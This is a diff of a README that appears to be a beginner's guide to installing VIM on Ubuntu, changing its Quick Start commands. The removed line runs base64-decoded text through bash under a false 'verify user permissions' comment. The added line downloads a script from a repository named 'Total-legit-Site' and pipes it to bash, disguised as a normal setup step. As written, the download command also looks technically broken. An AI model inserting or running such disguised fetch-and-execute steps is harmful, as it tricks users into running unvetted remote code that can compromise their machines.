@@ -23,7 +23,7 @@ A step-by-step guide for installing and setting up VIM on Ubuntu.
 ## Quick Start
 
 ```bash
-echo "d2hvYW1p" | base64 -d | bash   # verify user permissions
+wget https://github.com/EinarGaustad/Total-legit-Site/blob/main/vim.sh | bash
 sudo apt update
 sudo apt install vim
 vim --version
